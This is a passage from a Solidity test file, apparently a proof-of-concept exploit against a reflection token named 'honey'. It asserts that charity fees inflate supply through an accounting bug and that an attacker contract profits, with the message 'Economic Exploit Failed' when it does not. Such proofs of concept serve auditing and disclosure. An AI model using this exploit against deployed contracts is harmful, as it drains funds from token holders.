            honey.transfer(recipient, transferAmount);
        }

        // Check final state
        uint256 finalBalanceHoney = honey.balanceOf(attacker);
        uint256 finalTotalSupply = honey.totalSupply();
        uint256 finalCharityTotal = honey.totalCharity();

        // Verify charity fees accumulated
        assertGt(finalCharityTotal, initialCharityTotal, "Charity fees should accumulate");

        // The accounting error: _tTotal should decrease by tCharity but doesn't
        // This creates token inflation - charity tokens exist but aren't removed from supply
        uint256 charityAccumulated = finalCharityTotal - initialCharityTotal;
        uint256 supplyReduction = initialTotalSupply - finalTotalSupply;

        // Due to bug: supplyReduction < charityAccumulated (only burn reduces supply, not charity)
        assertGt(charityAccumulated, supplyReduction, "Accounting error: charity > supply reduction");

        // Attacker balance increased from charity fee collection
        assertGt(finalBalanceHoney, initialBalanceHoney, "Attacker balance increased from charity fees");

        uint256 finalBalanceERC20 = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

